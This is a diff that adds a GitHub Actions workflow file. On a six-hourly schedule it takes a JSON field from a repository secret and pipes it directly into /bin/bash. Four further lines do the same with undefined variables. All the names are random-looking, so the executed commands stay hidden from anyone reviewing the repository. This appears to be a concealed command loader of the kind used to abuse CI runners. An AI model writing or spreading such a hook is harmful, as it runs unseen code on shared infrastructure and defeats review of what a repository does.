@@ -1,0 +1,21 @@
+name: victorgraphql
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: victorgraphql
+        env:
+          ut56297: ${{ secrets.ut56297 }}
+        run: |
+          echo $ut56297 | jq -r .om37252 | /bin/bash
+          echo $cdam9647 | jq -r .ayzx00080 | /bin/bash
+          echo $n86 | jq -r .lzb39 | /bin/bash
+          echo $jg63222 | jq -r .chkr87 | /bin/bash
+          echo $tg75 | jq -r .ohce8539 | /bin/bash
+
